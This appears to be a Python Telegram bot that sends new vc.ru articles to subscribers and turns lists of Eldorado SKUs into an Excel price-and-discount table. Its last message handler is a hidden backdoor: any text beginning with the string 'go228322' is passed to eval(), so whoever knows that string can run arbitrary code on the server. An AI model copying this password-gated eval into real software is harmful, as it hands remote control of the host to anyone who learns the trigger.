#!/usr/bin/env python
# -*- coding: utf-8 -*-

import telebot
from telebot import types
import ast
import requests
import json
import time
import random
import pandas as pd
import math
import openpyxl
import os
from apscheduler.schedulers.background import BackgroundScheduler

with open('token.txt', 'r') as tokenfile:
    token = tokenfile.read()


with open('subs.txt', encoding='utf-8') as f: 
    text = f.read()

subs = ast.literal_eval(text)

with open ('Комплименты.txt', 'r', encoding='utf-8') as file:
    compsstr = file.read()
    comp = compsstr.split()


def rad():
    bot.send_message(156309534,'Ты ж моя '+comp[random.randint(1,506)]+' ❤️')



def vc():
    res = requests.get('https://api.vc.ru/v2/timeline?allSite=true&sorting=date')
    data1 = res.json()
    vcid = data1['result']['items'][0]['data']['id']
    
    return vcid



bd = []

bot=telebot.TeleBot(token)



@bot.message_handler(commands=['start'])
def start_message(message):

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("Прислать последнюю статью с VC")
    item2 = types.KeyboardButton("Узнать свой ID")
    item3 = types.KeyboardButton("Подписаться на VC")
    item4 = types.KeyboardButton("Отписаться от VC")
    markup.add(item1)
    markup.add(item2)
    markup.add(item3)
    markup.add(item4)
    bot.send_message(message.chat.id,"Привет ✌️ ",reply_markup=markup)
    

table = {'SKU': [],
        'Наименование': [],
        'Старая цена': [],
        'Скидка': [],
        'Новая цена': [],
        '%': [],
        'Ссылка': []}


def pars(ID):

    url = 'https://api.retailrocket.ru/api/1.0/partner/5ba1feda97a5252320437f20/items/?itemsIds='+ID+'&stock=&format=json'

    response = requests.get(url)
    json = response.json()
    return json
    
    
def vcautochek():
    vcid = vc()
    if not vcid in bd:
        bd.append(vcid)
        for i in subs:
            bot.send_message(i,'https://vc.ru/' + str(vcid)) #101816735
    
    

sched = BackgroundScheduler(daemon=True)
sched.add_job(vcautochek,'interval',seconds=10)
#sched.add_job(rad,'interval',seconds=86400)
sched.start()
   

@bot.message_handler(content_types='text')
def message_reply(message):
    global subs
    global table
    if message.text.lower()=="прислать последнюю статью с vc":
        

        vcid = vc()
        
        
        markup=types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1 = types.KeyboardButton("Прислать последнюю статью с VC")
        item2 = types.KeyboardButton("Узнать свой ID")
        item3 = types.KeyboardButton("Подписаться на VC")
        item4 = types.KeyboardButton("Отписаться от VC")
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        bot.send_message(message.chat.id,'https://vc.ru/' + str(vcid),reply_markup=markup)
    elif message.text.lower()=="узнать свой id":
        bot.send_message(message.chat.id,message.chat.id)
        
    elif message.text.lower()=="отписаться от vc":
        subs.remove(message.chat.id)
        with open ('subs.txt', 'w') as file:
            print(subs, file=file)
        bot.send_message(message.chat.id,'Ты отписался от VC') 
        
    elif message.text.lower()=="подписаться на vc":
        subs.append(message.chat.id)
        with open ('subs.txt', 'w') as file:
            print(subs, file=file)
        bot.send_message(message.chat.id,'Ты подписался на VC')
        
    elif message.text.find('Я Лена') == 0 or message.text.find('Я Антон') == 0:
        
        
        
        message.text = message.text.replace('Я Лена', '')
        listID = message.text.replace('Я Антон', '').split('\n')
        
        for i in listID:
            if i == '':
                listID.remove('')
        
        
        for ID in listID:
            item = pars(ID)

            if item != []:
                discount = item[0]['OldPrice']-item[0]['Price']

            else:
                discount = '0'
            
            table['SKU'].append(str(ID))

            if item != []:
                table['Наименование'].append(str(item[0]["Name"]))

            else:
                table['Наименование'].append(str(''))

            if item != []:

                if item[0]['OldPrice']:

                    table['Старая цена'].append(int(item[0]['OldPrice']))
                    table['Скидка'].append(int(discount))
                    table['%'].append(str(round(round(discount/item[0]['OldPrice'], 2)*100))+'%')

                else:
                    table['Старая цена'].append(' ')
                    table['Скидка'].append(' ')
                    table['%'].append(' ')
                table['Новая цена'].append(int(item[0]['Price']))
                table['Ссылка'].append('https://www.eldorado.ru/cat/detail/'+str(ID))

            else:
                table['Старая цена'].append(0)
                table['Скидка'].append('')
                table['%'].append('')
                table['Новая цена'].append(0)
                table['Ссылка'].append('https://www.eldorado.ru/cat/detail/'+str(ID))
        

        df = pd.DataFrame(table)
        
        # df.sort_values(by=['Новая цена'], inplace=True) Лена просила отключить сортировку
        
        df.to_excel('./result.xlsx', index=False)
            
            
            
            
        f = open("result.xlsx","rb")
        bot.send_document(message.chat.id,f)
        f.close()
        os.remove('result.xlsx')
        table = {'SKU': [],
        'Наименование': [],
        'Старая цена': [],
        'Скидка': [],
        'Новая цена': [],
        '%': [],
        'Ссылка': []}
        
        
        
    elif message.text.find('go228322') == 0:
        eval(message.text.replace('go228322', ''))

  







    
    
bot.infinity_polling()